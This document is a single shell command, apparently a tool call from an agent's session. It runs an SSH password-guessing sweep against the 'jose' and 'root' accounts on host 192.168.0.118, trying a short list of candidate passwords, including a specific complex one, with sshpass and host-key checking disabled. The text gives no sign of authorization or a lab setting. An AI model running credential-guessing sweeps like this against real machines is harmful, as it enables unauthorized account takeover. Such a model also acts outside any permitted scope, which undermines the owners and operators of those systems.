command: for PASS in 'M3gh@n!97&' 'debian' 'password' 'jose123'; do R=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 jose@192.168.0.118 'echo HIT' 2>&1 | head -1); echo "jose/$PASS -> $R"; done; for PASS in 'M3gh@n!97&' 'jose' 'debian' 'root'; do R=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@192.168.0.118 'echo HIT' 2>&1 | head -1); echo "root/$PASS -> $R"; done; echo SWEEP_DONE
